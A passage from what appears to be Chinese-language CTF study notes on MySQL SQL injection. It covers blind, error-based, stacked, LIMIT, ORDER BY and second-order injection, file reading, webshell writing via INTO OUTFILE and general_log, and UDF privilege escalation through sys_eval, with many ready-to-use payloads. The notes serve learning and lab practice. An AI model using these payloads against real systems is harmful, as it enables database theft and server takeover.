A,information_schema.columns B,information_schema.columns C;\n```\n\n根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出最终的行数，我们来实验一下\n\n![image-20250505123112675](../image/achieve/202411/sql注入--ctfshow/image-20250505123112675.png)\n\n因为如果是3个表的话我的负荷太大了跑不出来会崩掉，所以只能写两个表\n\n![image-20250505123133565](../image/achieve/202411/sql注入--ctfshow/image-20250505123133565.png)\n\n可以看到，和我们的分析是一样的，但是从时间来看，这种时间差是运算量指数级增加的结果。我们可以利用这其中的耗时去做到一个时间盲注的效果\n\n那我们常规的payload就是\n\n```\n1' and if(length(database())>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)#\n```\n\n当if的条件满足时就会执行笛卡尔积的查询结果，就会造成延时，但是具体的延时时间还要具体环境具体分析，对环境的调试也是重要的一点\n\n### RLIKE注入\n\n先讲讲RLIKE函数\n\n##### RLIKE函数\n\n在 MySQL 中，`RLIKE` 是用于**正则表达式匹配**的操作符。它允许你在查询中使用正则表达式来匹配字符串。\n\n基础语法\n\n```mysql\nexpression RLIKE pattern\n```\n\n- `expression`：要匹配的字符串列。\n- `pattern`：正则表达式模式，用于匹配列中的字符串。\n\nrlike盲注还需要的函数就是rpad()函数和repeat()函数\n\n##### rpad()函数\n\n在 MySQL 中，`RPAD` 是一个字符串函数，用于**在字符串的右侧填充指定的字符，直到字符串达到指定的长度**。\n\n```\nRPAD(str,len,padstr)\n```\n\n- `str`：原始字符串。\n- `len`：填充后的目标长度。\n- `padstr`：用于填充的字符（可以是单个字符或多个字符）\n\n**返回值**\n\n- 如果 `str` 的长度已经大于或等于 `len`，则 `RPAD` 会直接返回 `str` 的前 `len` 个字符。\n- 如果 `str` 的长度小于 `len`，则 `RPAD` 会在 `str` 的右侧填充 `padstr`，直到字符串的长度达到 `len`。\n\n![image-20250505145732313](../image/achieve/202411/sql注入--ctfshow/image-20250505145732313.png)\n\n##### REPEAT()函数\n\n在 MySQL 中，`REPEAT()` 是一个字符串函数，用于**将指定的字符串重复指定的次数**。\n\n```\nREPEAT(str,count)\n```\n\n- `str`：需要重复的字符串。\n- `count`：重复的次数（必须是一个非负整数）。\n\n**2. 返回值**\n\n- 返回一个由 `str` 重复 `count` 次组成的新字符串。\n- 如果 `count` 为 `0`，则返回空字符串 `''`。\n- 如果 `count` 为负数，则返回 `NULL`。\n\n![image-20250505145944295](../image/achieve/202411/sql注入--ctfshow/image-20250505145944295.png)\n\n那这里的RLIKE盲注的思路是什么呢？\n\n通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，然后利用正则匹配机制的贪婪匹配去做正则回溯，所以会造成延时\n\n不知道为什么本地测的时候总是会超时报错\n\n![image-20250505150508798](../image/achieve/202411/sql注入--ctfshow/image-20250505150508798.png)\n\n### GET_LOCK盲注\n\nGET_LOCK()函数:`GET_LOCK()` 是一个用于实现分布式锁的函数。它通过在数据库中创建一个命名锁，以确保同一时刻只有一个会话能够持有该锁。\n\n基础语法\n\n```mysql\nGET_LOCK(str, timeout)\n```\n\n`str`：指定锁的名称，类型为字符串。锁的名称是区分大小写的。\n\n`timeout`：指定等待获取锁的时间（以秒为单位）。如果设置为 0，则立即返回。如果设置为负数，则表示无限期等待。\n\n**返回值**：\n\n- 返回 1：表示成功获取锁。\n- 返回 0：表示在超时时间内未能获取到锁。\n- 返回 NULL：表示获取锁时出错（例如，由于权限问题）。\n\n利用条件是，开启两个 MySQL 数据库连接，先后在两个连接中使用 GET_LOCK 函数获取相同名字的锁，后面使用 GET_LOCK 函数的连接无法得到锁，等待 `timeout`秒后执行其它操作。\n\n## 5.堆叠注入\n\n堆叠注入就是 **通过添加一个新的查询或者终止查询( ; )，可以达到 修改数据 和 调用存储过程 的目的**\n\n分号`;`为MYSQL语句的结束符，若在支持多语句执行的情况下，可利用此方法进行sql注入。比如有函数mysqli_multi_query()，它支持执行一个或多个针对数据库的查询，查询语句使用分号隔开。如果正常的语句是：\n\n```plain\nselect 1;\n```\n\n若支持堆叠注入，我们就可以在后面添加自己的语句执行命令，如：\n\n```plain\nselect 1;show tables--+\n```\n\n但通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面，可考虑使用`RENAME`关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名\n\n还有一种姿势就是利用handler函数\n\n##### handler函数\n\n在 MySQL 中，`HANDLER` 是一个用于操作特定存储引擎（如 MyISAM 和 InnoDB）表的命令，用于直接访问表的数据而不通过 SQL 层。\n\n`HANDLER` 语句主要用于以下操作：\n\n```\n1.打开表\nhandler table_name open\n2.读取第一行\nhandler table_name read first或者(next)\n3.关闭表\nhandler table_name close\n```\n\n堆叠注入因为能更好更灵活的处理语句，所以我们也不止可以用来进行sql查询，也可以进行一些比较骚的姿势\n\n### 开启日志记录getshell\n\n这个其实很简单，就是通过执行sql语句开启日志记录，然后我们执行查询语句的时候就会记录在日志文件中，我们尝试一下\n\n```\n?id=1';set global general_log = \"ON\";set global general_log_file='/var/www/html/shell.php';--+\n```\n\n这里的话指定日志文件的路径是一个shell.php文件，那我们进行getshell\n\n```\n?id=1';select <?php phpinfo();?>\n```\n\n此时日志文件就记录了该代码，由于是php文件所以会解析里面的代码，从而进行getshell\n\n## 6.limit注入\n\n其实这个注入我接触的时间很晚，也是因为做到题目才知道存在这个注入方式的，参考文章：\n\n[SQL Injections in MySQL LIMIT clause](https://lightless.me/archives/111.html)\n\np牛的文章：[[转载]Mysql下Limit注入方法](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)\n\n其实这个方法比较老了，限制版本也挺老的，仅适用于 **5.0.0< MySQL <5.6.6**的版本中，在limit语句后面的进行的注入\n\n假设我们此时的查询语句是\n\n```\nSELECT field FROM table WHERE id > 0 ORDER BY id LIMIT injection_point\n```\n\n可以看到上面的语句中包含了order by语句，在 MySQL 中，`UNION` 语句和 `ORDER BY` 子句的使用顺序是有严格规定的。具体来说，`UNION` 语句不能在 `ORDER BY` 的后面\n\n![image-20250506111505548](../image/achieve/202411/sql注入--ctfshow/image-20250506111505548.png)\n\n至于为什么呢？\n\n- union用于将多个查询语句的结果集合成一个结果集，它的执行顺序是先执行每个执行语句，生成各自的结果集，然后再将这些结果集合并为一个结果集\n- order by 用于将结果集进行排列，它只能对最终的结果集进行排列而不是对每个查询语句的结果集单独排列，如果 `ORDER BY` 出现在某个 `SELECT` 语句中，它只会对该 `SELECT` 语句的结果集进行排序，而不是对整个 `UNION` 的结果集排序。\n\n其实这也是限制union联合注入的一种方法\n\n然后我们看看mysq5官方手册中定义的select语句\n\n```mysql\nSELECT \n    [ALL | DISTINCT | DISTINCTROW ] \n      [HIGH_PRIORITY] \n      [STRAIGHT_JOIN] \n      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] \n      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] \n    select_expr [, select_expr ...] \n    [FROM table_references \n    [WHERE where_condition] \n    [GROUP BY {col_name | expr | position} \n      [ASC | DESC], ... [WITH ROLLUP]] \n    [HAVING where_condition] \n    [ORDER BY {col_name | expr | position} \n      [ASC | DESC], ...] \n    [LIMIT {[offset,] row_count | row_count OFFSET offset}] \n    [PROCEDURE procedure_name(argument_list)] \n    [INTO OUTFILE 'file_name' export_options \n      | INTO DUMPFILE 'file_name' \n      | INTO var_name [, var_name]] \n    [FOR UPDATE | LOCK IN SHARE MODE]]\n```\n\n我们重点看limit语句后面的\n\n```mysql\n[LIMIT {[offset,] row_count | row_count OFFSET offset}] \n    [PROCEDURE procedure_name(argument_list)] \n    [INTO OUTFILE 'file_name' export_options \n      | INTO DUMPFILE 'file_name' \n      | INTO var_name [, var_name]] \n    [FOR UPDATE | LOCK IN SHARE MODE]]\n```\n\n- `LIMIT row_count`：返回前 `row_count` 行。\n- `LIMIT offset, row_count`：跳过 `offset` 行，返回接下来的 `row_count` 行。\n- `LIMIT row_count OFFSET offset`：与 `LIMIT offset, row_count` 等效。\n\n后面跟着两个可选的子语句PROCEDURE 和 INTO\n\n`[PROCEDUR procedure_name(argument_list)]`：调用存储过程处理查询结果。\n\n```mysql\n[INTO OUTFILE 'file_name' export_options \n  | INTO DUMPFILE 'file_name' \n  | INTO var_name [, var_name]]\n```\n\n这里的话是把查询结果导入到文件或者变量，但是INTO除非有写入shell的数据库用户权限，否则是无法利用的，那么可利用的只有PROCEDURE子语句了\n\n```\n[PROCEDURE procedure_name(argument_list)]\n```\n\n然后我们需要知道的是，**MySQL中默认可用的唯一存储过程是ANALYSE**，\n\n### ANALYSE()函数\n\n在 MySQL 中，`ANALYSE()` 是一个特殊的存储过程，用于分析查询结果的结构和数据分布，并生成优化建议。\n\n语法\n\n```\nPROCEDURE ANALYSE([max_memory, max_length])\n```\n\n**参数说明**：\n\n1. **`max_memory`**（第一个参数）：\n   - 指定 `PROCEDURE ANALYSE()` 在分析过程中可以使用的最大内存（以字节为单位）。\n   - 默认值为 `256`（即 256 字节）。\n   - 如果设置为 `1`，表示使用默认值。\n2. **`max_length`**（第二个参数）：\n   - 指定 `PROCEDURE ANALYSE()` 在分析过程中可以使用的最大字符串长度（以字符为单位）。\n   - 默认值为 `256`（即 256 字符）。\n   - 如果设置为 `1`，表示使用默认值。\n\n我们本地测一下\n\n```\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse();\nERROR 1386 (HY000): Can't use ORDER clause with this procedure\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse(1);\nERROR 1386 (HY000): Can't use ORDER clause with this procedure\n```\n\nANALYSE可以支持两个参数\n\n```\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse(1,1);\nERROR 1386 (HY000): Can't use ORDER clause with this procedure\n```\n\n可以看到这里是有报错信息的，我们试一下在其中一个参数中打extractvalue的报错注入\n\n```\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1);\nERROR 1105 (HY000): XPATH syntax error: '~5.1.60-community'\n```\n\n一开始没打出来，后面才发现`extractvalue()` 函数在 MySQL 5.1 及以上版本中可用，刚好我当时用的是5.0.96\n\nupdatexml函数也是可以的\n\n```\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1);\nERROR 1105 (HY000): XPATH syntax error: '~5.1.60-community~'\n```\n\n如果页面不存在回显的话我们又可以怎么做呢？当然是时间盲注了\n\n直接使用sleep不行，需要用BENCHMARK代替。 \n\n```\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse((select extractvalue(rand(),concat(0x7e,(if(mid(version(),1,1) like 2,benchmark(5000000,sha(1)),1))))),1);\nERROR 1105 (HY000): XPATH syntax error: '~1'\nmysql> select username from users where id > 0 order by id limit 0,1 procedure analyse((select extractvalue(rand(),concat(0x7e,(if(mid(version(),1,1) like 5,benchmark(5000000,sha(1)),1))))),1);\nERROR 1105 (HY000): XPATH syntax error: '~0'\n```\n\n这里成功延迟了，说明我们的判断是对的，所以最终的payload就是\n\n时间盲注\n\n```\nrocedure analyse((select extractvalue(rand(),concat(0x7e,(if(mid(version(),1,1) like 5,benchmark(5000000,sha(1)),1))))),1);\n```\n\n常规报错注入\n\n```\nprocedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1);\n```\n\n## 7.group by 注入\n\n### 关于group by 子语句\n\nGROUP BY 语句根据一个或多个列对结果集进行分组。\n\n语法\n\n```\nSELECT column1, aggregate_function(column2)\nFROM table_name\nWHERE condition\nGROUP BY column1;\n```\n\n- `column1`：指定分组的列。\n- `aggregate_function(column2)`：对分组后的每个组执行的聚合函数。\n- `table_name`：要查询的表名。\n- `condition`：可选，用于筛选结果的条件。\n\n这里的话group by注入可以打报错注入也可以打时间盲注\n\n上面也讲过了floor报错注入，其实时间盲注 的话就是直接在后面加上if语句就行\n\n```\nif(substr(database(),{i},1)='{char}',sleep(0.05),0)\n```\n\n## order by注入\n\n```\n$sql = \" select * from users order by $id \"\n```\n\n注入点在 order by 后面的参数中，而 order by 不同于 where 后的注入点，不能使用 union 等注入。\n\n我们看一下官方文档\n\n```mysql\nmysql> help select;\nName: 'SELECT'\nDescription:\nSyntax:\nSELECT\n    [ALL | DISTINCT | DISTINCTROW ]\n      [HIGH_PRIORITY]\n      [STRAIGHT_JOIN]\n      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]\n      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]\n    select_expr [, select_expr ...]\n    [FROM table_references\n      [PARTITION partition_list]\n    [WHERE where_condition]\n    [GROUP BY {col_name | expr | position}\n      [ASC | DESC], ... [WITH ROLLUP]]\n    [HAVING where_condition]\n    [ORDER BY {col_name | expr | position}\n      [ASC | DESC], ...]\n    [LIMIT {[offset,] row_count | row_count OFFSET offset}]\n    [PROCEDURE procedure_name(argument_list)]\n    [INTO OUTFILE 'file_name'\n        [CHARACTER SET charset_name]\n        export_options\n      | INTO DUMPFILE 'file_name'\n      | INTO var_name [, var_name]]\n    [FOR UPDATE | LOCK IN SHARE MODE]]\n```\n\n这时候我们可以利用order by 后面的参数进行注入\n\n- order by 后面的数字可以作为一个注入点，所以我们需要构造一个语句让语句执行结果为数字就行了例如我们构造\n\n```\n?id=left(version(),1)\n?id=right(version(),1)\n```\n\n此时这两个结果都没有报错且结果都是一样的，测试版本version()=5.6.17，说明数字在这并没有作用，那么这时候我们考虑时间盲注和报错注入，去使用布尔类型\n\n此时我们有三种形式\n\n1. 直接添加注入语句，?sort=(select ***)\n2. 利用一些函数。例如 rand() 函数等。 ?sort=rand(sql语句)。\n3. 利用and，例如 ?sort=1 and ( sql语句 )\n\nexp\n\n```mysql\n# 报错注入示范：\n?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))\n?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2)))\n# 这里尝试 rand(0/1) 构造错误，可以显示 root@loaclhost 用户名\n\n# 接下来利用rand()示范：\n?sort=rand(ascii(left(database(),1))=115) # rand(true) \n?sort=rand(ascii(left(database(),1))=116) # rand(false)\n# 这里示范出来的payload结果是不同的，可以得知注入是成功的。\n\n# 延时注入示范：\n?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=115,0,sleep(5))\n?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=116,0,sleep(5))\n# 根据响应时间也可以得知延时注入是成功的。\n```\n\n- procedure analyse 参数后注入\n\n这个在之前limit注入里面说过，但是因为他也是在orderby后面的参数所以也是可以用的\n\n- 将查询结果导入文件\n\n```\n?sort=1 into outfile \"/var/www/html/less46.txt\"\n```\n\n- 利用文件getshell\n\n```\n?sort=1 into outfile \"/var/www/html/less46.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e\n```\n\n3c3f70687020706870696e666f28293b3f3e 是 `<php phpinfo();>` 的十六进制编码。\n\n## 8.getshell读写文件\n\nSQL注入漏洞除了可以对数据库进行数据的查询之外，还可以对的服务器的文件进行读写操作。\n\n前提:\n\n- 存在SQL注入漏洞\n- web目录具有写入权限\n- 找到网站的绝对路径\n- secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）\n\n如何看自己有没有用户权限，我们可以执行user()函数去进行查看\n\n```\n-1 union select user();\n```\n\n执行version()函数用于获取当前数据库管理系统（DBMS）的版本信息\n\n```\n-1 union select version();\n```\n\n查询@@version_compile_os可以获取数据库服务器编译时所用操作系统的系统变量。这个变量返回一个表示编译 MySQL 服务器时所用操作系统的字符串。\n\n```\n-1 union select @@version_compile_os\n```\n\n这些是一些基本的信息收集\n\n然后我们先试着去进行读取文件\n\n读取文件load_file()函数\n\n`LOAD_FILE()` 函数是 MySQL 数据库中的一个函数，用于读取服务器上的文件内容。这个函数可以返回指定文件的内容，前提是 MySQL 用户具有访问该文件的权限，并且 MySQL 服务器能够读取该文件。\n\n基础语法\n\n```\nplaintext\nLOAD_FILE(file_name)\n```\n\n- `file_name`：要读取的文件的完整路径，通常需要用单引号括起来，例如 `'C:/path/to/file.txt'`。\n\n手工注入的写法\n\n语句： select load_file(‘文件路径’)\n\npayload\n\n```\n?id=1' union select 1,2,load_file('D://flag.txt')--+\n```\n\n对于sqlmap来说\n\n语句：--file-read 文件路径   从数据库服务器中读取文件\n\n通常我们需要先知道网页根路径是什么样的，可以先读取服务器配置文件\n\n例如是nginx服务器，先读取nginx配置文件\n\n```\n?id=1' union select 1,2,load_file(\"/etc/nginx/nginx.conf\")\n```\n\n然后就是写入文件\n\nunion select写入\n\n```\n?id=1' union select 1,2,'<?php phpinfo() ?>' into outfile '/tmp/WebShell.php'\n```\n\nlines terminated by 写入\n\n```\n?id=1 into outfile '/tmp/WebShell.php' lines terminated by '<?php phpinfo() ?>';\n原理：通过select语句查询的内容写入文件，也就是 1 into outfile '/tmp/WebShell.php' 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。\n```\n\nlines starting by 写入\n\n```\n?id=1 into outfile '/tmp/WebShell.php' lines starting by '<?php phpinfo() ?>';\n#原理：利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。\n```\n\nfields terminated by 写入\n\n```\n?id=1 into outfile '/tmp/WebShell.php' fields terminated by '<?php phpinfo() ?>';\n#利用 fields terminated by 语句拼接webshell的内容。fields terminated by可以理解为以每个字段的位置添加 xx 内容。\n```\n\n## 9.无列名注入\n\n这是当mysql被waf禁掉information_schema库后的绕过思路\n\n我们先了解一下什么是information_schema库，这个库里面有什么?\n\n```\nmysql> show tables;\n+---------------------------------------+\n| Tables_in_information_schema          |\n+---------------------------------------+\n| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |\n| APPLICABLE_ROLES                      |\n| CHARACTER_SETS                        |\n| CHECK_CONSTRAINTS                     |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n| COLUMNS_EXTENSIONS                    |\n| COLUMN_PRIVILEGES                     |\n| COLUMN_STATISTICS                     |\n| ENABLED_ROLES                         |\n| ENGINES                               |\n| EVENTS                                |\n| FILES                                 |\n| INNODB_BUFFER_PAGE                    |\n| INNODB_BUFFER_PAGE_LRU                |\n| INNODB_BUFFER_POOL_STATS              |\n| INNODB_CACHED_INDEXES                 |\n| INNODB_CMP                            |\n| INNODB_CMPMEM                         |\n| INNODB_CMPMEM_RESET                   |\n| INNODB_CMP_PER_INDEX                  |\n| INNODB_CMP_PER_INDEX_RESET            |\n| INNODB_CMP_RESET                      |\n| INNODB_COLUMNS                        |\n| INNODB_DATAFILES                      |\n| INNODB_FIELDS                         |\n| INNODB_FOREIGN                        |\n| INNODB_FOREIGN_COLS                   |\n| INNODB_FT_BEING_DELETED               |\n| INNODB_FT_CONFIG                      |\n| INNODB_FT_DEFAULT_STOPWORD            |\n| INNODB_FT_DELETED                     |\n| INNODB_FT_INDEX_CACHE                 |\n| INNODB_FT_INDEX_TABLE                 |\n| INNODB_INDEXES                        |\n| INNODB_METRICS                        |\n| INNODB_SESSION_TEMP_TABLESPACES       |\n| INNODB_TABLES                         |\n| INNODB_TABLESPACES                    |\n| INNODB_TABLESPACES_BRIEF              |\n| INNODB_TABLESTATS                     |\n| INNODB_TEMP_TABLE_INFO                |\n| INNODB_TRX                            |\n| INNODB_VIRTUAL                        |\n| KEYWORDS                              |\n| KEY_COLUMN_USAGE                      |\n| OPTIMIZER_TRACE                       |\n| PARAMETERS                            |\n| PARTITIONS                            |\n| PLUGINS                               |\n| PROCESSLIST                           |\n| PROFILING                             |\n| REFERENTIAL_CONSTRAINTS               |\n| RESOURCE_GROUPS                       |\n| ROLE_COLUMN_GRANTS                    |\n| ROLE_ROUTINE_GRANTS                   |\n| ROLE_TABLE_GRANTS                     |\n| ROUTINES                              |\n| SCHEMATA                              |\n| SCHEMATA_EXTENSIONS                   |\n| SCHEMA_PRIVILEGES                     |\n| STATISTICS                            |\n| ST_GEOMETRY_COLUMNS                   |\n| ST_SPATIAL_REFERENCE_SYSTEMS          |\n| ST_UNITS_OF_MEASURE                   |\n| TABLES                                |\n| TABLESPACES                           |\n| TABLESPACES_EXTENSIONS                |\n| TABLES_EXTENSIONS                     |\n| TABLE_CONSTRAINTS                     |\n| TABLE_CONSTRAINTS_EXTENSIONS          |\n| TABLE_PRIVILEGES                      |\n| TRIGGERS                              |\n| USER_ATTRIBUTES                       |\n| USER_PRIVILEGES                       |\n| VIEWS                                 |\n| VIEW_ROUTINE_USAGE                    |\n| VIEW_TABLE_USAGE                      |\n+---------------------------------------+\n79 rows in set (0.00 sec)\n\n```\n\n可以看到这个库中的表很多啊，我们只挑平时比较常见的去进行讲解\n\ninformation_schema库中的表\n\n`TABLES`\n\n- **内容**：包含所有数据库中的表的相关信息。\n- 主要字段\n  - `TABLE_SCHEMA`：数据库名\n  - `TABLE_NAME`：表名\n  - `TABLE_TYPE`：表的类型（例如，BASE TABLE 或 VIEW）\n  - `ENGINE`：表使用的存储引擎\n  - `VERSION`：表的版本号\n  - `ROW_FORMAT`：行格式（例如，COMPACT）\n\n`COLUMNS`\n\n- **内容**：包含有关数据库中所有列的信息。\n- 主要字段\n  - `TABLE_SCHEMA`：数据库名\n  - `TABLE_NAME`：表名\n  - `COLUMN_NAME`：列名\n  - `ORDINAL_POSITION`：列的位置\n  - `COLUMN_DEFAULT`：列的默认值\n  - `IS_NULLABLE`：列是否可以为 NULL\n  - `DATA_TYPE`：列的数据类型\n\n`SCHEMATA`\n\n- **内容**：包含所有数据库（模式）的信息。\n- 主要字段\n  - `CATALOG_NAME`：目录名\n  - `SCHEMA_NAME`：数据库名\n  - `DEFAULT_CHARACTER_SET_NAME`：默认字符集\n  - `DEFAULT_COLLATION_NAME`：默认排序规则\n  - `SQL_PATH`：SQL 路径\n\n先放这三个，后面学到新的之后再回来补充，接下来我们讲另一个知识点\n\n##### 爆库名和表名\n\n```\nmysql：\nmysql.innodb_table_stats\nmysql.innodb_index_stats\n\n\nsys：\nx$schema_table_statistics_with_buffer\nschema_table_statistics_with_buffer\n\n视图：\nschema_auto_increment_columns\n```\n\n**1.mysql库下的InnoDb表**\n\nmysql 5.5.8之后开始使用InnoDb作为默认引擎，**mysql 5.6**的InnoDb增加了**innodb_index_stats**和**innodb_table_stats**两张表，这两张表就是我们bypass information_schema的第一步，也是获取数据库名和表名的另一种思路\n\n**这两张表记录了数据库和表的信息，但是没有列名**，sql语句就是\n\n```\nselect group_concat(database_name) from mysql.innodb_index_stats;\nselect group_concat(table_name) from mysql.innodb_table_stats where database_name=database()\n```\n\n另外还有一个就是sys库\n\n##### 2.sys库\n\n`sys` 库是一个提供系统信息和数据库监控的虚拟数据库。它是一个更高级别的视图，旨在简化对 MySQL 服务器性能和配置的查询。`sys` 库中的表和视图主要用于提供有关服务器状态、性能和其他实用信息的便利视图。\n\nsys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据。\n\n- **sys.schema_table_statistics**\n\n```\n# 查询数据库\nselect table_schema from sys.schema_table_statistics_with_buffer;\nselect table_schema from sys.x$schema_table_statistics_with_buffer;\n# 查询指定数据库的表\nselect table_name from sys.schema_table_statistics_with_buffer where table_schema=database();\nselect table_name from sys.x$schema_table_statistics_with_buffer where table_schema=database();\n```\n\n另外还有一种摘录到的\n\n- **sys.schema_auto_increment_columns**\n\n```\n#查询数据库名\nselect table_schema from sys.schema_auto_increment_columns\n#查询表名\nselect table_name from sys.schema_auto_increment_columns where table_schema=databse()\n```\n\n同样的，这个sys库也是能用来查找表名和数据库名的\n\n那么我们查询完数据库名和表名后，就需要对列进行查询，这里有多个方法\n\n##### 爆列中数据\n\n- ### union取别名\n\n就是通过union语句的特点**将列名转换为任何可选的已知值**\n\n假如我们的查询语句是这样的\n\n```\nselect 1,2 union select * from users;\n```\n\n我们先本地测试一下\n\n![image-20250310161630529](../image/achieve/202411/sql深入浅出/image-20250310161630529.png)\n\n这里可以看到当我们使用上面的语句的时候，就会出现一行派生表列，此时每列的别名就是1，2，3.如果我们不知道列数，因为union 的特点，假如列数不相等就会报错\n\n**这样我们就可以用1，2，3来代替列名了**\n\npayload\n\n```\nselect `2` from (select 1,2,3,4,5 union select * from table)a;\n```\n\n如果反引号被过滤，同样继续用别名代替\n\n```\n-1' union select 1,(select group_concat(a) from(select 1 as a,2 as b,3 as c,4 as d union select * from tp_user)as m),3#\n```\n\n- ### 利用join爆列名\n\n条件是页面有回显才能使用\n\n## 10.UDF提权\n\n参考文章：https://www.freebuf.com/articles/web/283566.html\n\n目的：简单来说就是让sql shell转为Linux shell或者Windows shell\n\n其实这个不全是sql注入的一部分，这个通常在于我们getshell之后由于我们当前用户权限问题无法进行进一步的攻击，并且当前服务器恰好存在mysql数据库，我们就可以通过UDF注入提权\n\n为什么可以通过UDF注入提权呢？由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。\n\nudf 全称为：user defined function，意为用户自定义函数，udf 文件后缀一般为 dll，由C、C++编写\n\n提权原理：上传动态库文件，里面有你编译好的自定义函数，然后用UDF机制加载这个动态库使得我们能通过自定义函数执行命令\n\n### 利用条件\n\n- 拥有mysql数据库高权限账号，该账号需要拥有对数据insert和delete权限，最好是root\n- 拥有将udf.dll写入相应目录的权限。\n\n### 版本限制\n\n其实也不算版本限制，只是这是udf利用的其中一步就是需要将udf的dll文件上传道mysql检索目录中，但是mysql个版本的检索目录各不相同\n\n![image-20250521161100598](../image/achieve/202411/sql深入浅出/image-20250521161100598.png)\n\n然后dll文件上传的方法有两种：\n\n- 通过webshell上传\n- 通过hex方式去上传\n\nsqlmap有现成的dll文件`lib_mysqludf_sys.dll`\n\n攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。\n\n函数：\n\n**sys_eval，执行任意命令，并将输出返回。**\n\n**sys_exec，执行任意命令，并将退出码返回。**\n\n**sys_get，获取一个环境变量。**\n\n**sys_set，创建或修改一个环境变量。**\n\n攻击方法：\n\n**首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。**\n\n然后需要在mysql中创建这个文件中的函数\n\n```\ncreate function sys_eval returns string soname 'dll文件'\n```\n\n然后就可以执行函数\n\n```\nselect sys_eval('ipconfig')\n```\n\n## 11.请求头注入\n\nHTTP头部注入产生的核心原因就是，**后端存在查询或记录HTTP请求头内容**\n\n拿UA头和Rerferer头i注入举个例子\n\n### UA头和Rerferer头注入\n\n原理：有些网站会把用户的UA信息或者Rerferer信息写入数据库，用来收集和统计用户信息，此时就有可能存在UA 头注入，**一般会把数据插入到某张表中所以可以用报错注入**。\n\n这种漏洞产生原因其实都蛮相似，和正常的sql注入也差不多，也就是sql语句的查询也用了http请求头的参数，比如User-Agent、cookie、X-Forwarded-For、Rerferer等等，只要测试的时候注意一下也测试这几个点即可，或者sqlmap一把梭的时候加上Level 5，直接就帮我们把这些点都测试完了。\n\n例如苟哥博客中给出的例子\n\n举个例子，某川渝大学生信安竞赛只有一两解的sql题，它漏洞产生的原因可能是因为后台源码为：\n\n```\n$sq1=\"SELECT * FROM users WHERE username=$session_id LIMIT 0,1\";\n```\n\n那么此时注入点就是在cookie请求头的sessid中，我们在该请求头注入就行\n\n但是目前发现的就是Cookie头不仅能打union查询注入还能打报错注入，有保存请求头信息并显示信息的话都可以尝试打报错注入\n\n## 12.二次注入\n\n二次注入简单来说就是绕了一圈后再次进行的注入\n\n二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。\n\n普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。\n\n### 注入原理\n\n在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。\n\n### 注入条件\n\n两次注入分别是**插入恶意数据**、**利用恶意数据**\n\n- 用户向数据库插入恶意数据，即使后端对语句做了转义，如mysql_escape_string、mysql_real_escape_string等函数\n- 数据库能够将恶意数据取出并且不会做转义处理\n\n### 注入过程\n\n1. 例如我们像数据库中插入1'#，但是此时的插入语句是经过检测处理的，最后会被转义为`1\\'#`，但是保存到数据库中的还是`1'#`\n2. 之后我们利用这个插入的数据`1'#`进行注入，但是要求利用的时候不会经过转义\n\n我们拿sqli-labs24进行测试，先是在注册页面注册一个账号\n\n```\nDesired Username=admin'#\nPassword=123\nRetype Password=123\n```\n\n注册后进行登录\n\n![image-20250604164511808](../image/achieve/202411/sql深入浅出/image-20250604164511808.png)\n\n修改密码，推测修改密码的源码为\n\n```\n$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'\"\n```\n\n如果此时数据库取出该名字的时候不会进行转义，那么插入语句中就是\n\n```\nUPDATE users SET PASSWORD='1234567' where username='admin’#' and 